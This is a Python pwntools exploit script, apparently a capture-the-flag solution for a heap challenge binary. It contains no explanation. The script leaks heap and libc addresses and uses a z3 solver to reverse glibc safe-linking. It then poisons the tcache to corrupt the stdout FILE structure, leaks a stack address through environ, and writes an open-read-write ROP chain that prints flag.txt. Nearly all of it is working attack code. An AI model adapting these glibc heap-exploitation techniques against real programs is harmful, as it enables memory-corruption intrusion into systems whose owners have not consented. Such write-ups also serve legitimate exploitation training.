#!/usr/bin/python3
from z3 import *
from pwn import *

exe = ELF('vuln_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                 b*fgets+135

                c
                ''')

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('')
else:
        p = process(exe.path)

GDB()
def unsafe_link(e):
    high_e = e & 0xfffffff000000000
    x = BitVec('x',64)
    s = Solver()
    s.add(x & 0xfffffff000000000 == high_e)
    s.add(x ^ (x >> 12) == e)
    s.check()
    return s.model()[x].as_long()

def write(idx, size, context):
        sla(b"> ", b"1")
        sla(b": ", str(idx).encode())
        sla(b": ", str(size).encode())
        sla(b": ", context)
def free(idx):
        sla(b"> ", b"2")
        sla(b": ", str(idx).encode())
def show(idx):
        sla(b"> ", b"3")
        sla(b": ", str(idx).encode())
        value = u64(p.recvline(keepends = False).ljust(8, b"\0"))
        # res = (value >> 12) ^ value
        # return (res >> 24) ^ res
        return value

write(0, 0x20, "e"*8)
# Leak fd pointer
write(1, 0x20, "1"*8)
free(0)
free(1)
heap_leak = show(1)
heap_leak = unsafe_link(heap_leak)
info("heap leak: " + hex(heap_leak))
# Leak libc
write(0, 0x500-0x10, "a")
write(10, 0x100+0xa0, "a")
free(0)
libc_leak = show(0)
info("libc leak: " + hex(libc_leak))
libc.address = libc_leak - 0x219ce0
info("libc base: " + hex(libc.address))

# tcache
# fill tcache, merge chunk 7 8
for i in range(0,8):
        write(i, 0x100-0x10, b"a")
write(7, 0x100-0x10, "a")
write(8, 0x100-0x10, "a")
write(9, 0x100-0x10, "a")
write(10, 0x500-0x10, "a")
write(11, 0x100+0xa0, "a")
for i in range(0, 7):
        free(i)

free(7)
free(8)
free(9)
free(10)

# # ow size chunk 8
payload = b"".ljust(0x200-0x10)
payload+= p64(0x0) + p64(0x101)
write(0, 0x300-0x10,payload)
for i in range(3):
    write(0xa,0x100-8,b"A")
free(9)
free(0)

payload = b"".ljust(0x200-0x10)
payload+= p64(0x0) + p64(0x101)
payload+= p64((libc.sym['_IO_2_1_stdout_']-0x10) ^ (heap_leak+0xa10) >> 12)
write(0, 0x300-0x10,payload)
write(1, 0x100-0x10, "a")
info("stdout: " + hex(libc.sym._IO_2_1_stdout_))
payload=flat(
    0,libc.sym['_IO_file_jumps'],
    0xfbad1800 ,0xfbad1800 ,0xfbad1800 ,0xfbad1800 ,
    libc.sym['environ'],libc.sym['environ']+8,p64(libc.sym['_IO_2_1_stdout_']+131)*2,p64(libc.sym['_IO_2_1_stdout_']+132),
)

write(2, 0x100-0x10, payload)
stack = u64(p.recv(8))
info("Stack: " + hex(stack))
target=stack-0x168
log.info('[+]target:'+hex(target))
fakechunk=target

for i in range(5, 7):
    write(i, 0x280-0x8, b"a")
for i in range(5, 7):
    free(i)
free(0)
free(9)
payload = b"".ljust(0x200-0x10)
payload += flat(0, 0x281)
write(0, 0x300-0x8, payload) 

free(9)
free(0)

poprdi=libc.address+0x000000000002a3e5
poprax=libc.address+0x0000000000045eb0
poprsi=libc.address+0x000000000002be51
poprdx=libc.address+0x000000000011f497
syscall=libc.address+0x0000000000091396
ret=libc.address+0x0000000000029cd6

payload = b"".ljust(0x200-0x10)
payload+= p64(0x0) + p64(0x281)
payload+= p64((target-0x20) ^ (heap_leak+0x810) >> 12)
write(0, 0x300-0x10,payload)
write(1, 0x280-0x10, b"flag.txt\0")
payload = flat(ret, ret, ret, ret, ret, ret)
payload+= flat(
    poprdi, heap_leak + 0xa10,
    poprdx, 0x0, 0,
    poprsi, 0,
    poprax, 2,
    syscall,
    
    poprax, 0,
    poprdi, 3,
    poprsi, heap_leak+ 0xa10,
    poprdx, 0x100, 0,
    syscall,
    
    poprax, 1,
    poprdi, 1,
    poprsi, heap_leak+ 0xa10,
    poprdx, 0x100, 0,
    syscall
)
input()
write(1, 0x280-0x10, payload)
p.interactive()
